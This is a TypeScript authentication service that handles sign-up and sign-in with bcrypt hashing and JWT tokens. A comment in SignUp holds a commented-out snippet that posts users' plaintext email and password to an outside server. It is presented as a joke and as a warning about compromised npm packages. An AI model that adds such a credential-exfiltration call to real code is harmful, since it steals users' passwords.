import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import config from '@/config';
import bcrypt from 'bcryptjs'
import { IUserInputDTO } from '@/interfaces/IUser';
import { Logger } from 'winston';
import IDatabaseManager from '../models/IDatabaseManager';
import AccountEntity from '../models/Entity/AccountEntity';

@Service()
export default class AuthService {
  constructor(
    @Inject('dbContext') private dbContext: IDatabaseManager,
    @Inject('logger') private logger : Logger,
    // @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: AccountEntity; token: string }> {
    try {

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      //Encrypt user password 
      const encryptedPassword = await bcrypt.hash(userInputDTO.password, 10);

      this.logger.silly('Creating user db record');
      userInputDTO.password = encryptedPassword;
      const user = await this.dbContext.userModel.createAccount({
        ...userInputDTO,
      });
      
      console.log(user);
      if (!user) {
        throw new Error('User cannot be created');
      }
      // this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord); 
      
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user);

      // this.eventDispatcher.dispatch(events.user.signUp, { user: user});

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      Reflect.deleteProperty(user, 'passwordhash');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ userRecord: AccountEntity; token: string }> {
    const userRecord = await this.dbContext.userModel.findAccountByEmail( email );
    if (!userRecord) {
      throw new Error('User not registered');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await bcrypt.compare(password, userRecord.passwordhash);
    // const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      // const user = userRecord.toObject();
      Reflect.deleteProperty(userRecord, 'passwordhash');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      return { userRecord, token };
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user: AccountEntity) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user.account_id}`);
    return jwt.sign(
      {
        _id: user.account_id, // We are gonna use this in the middleware 'isAuth'
        name: user.first_name,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret
    );
  }
}
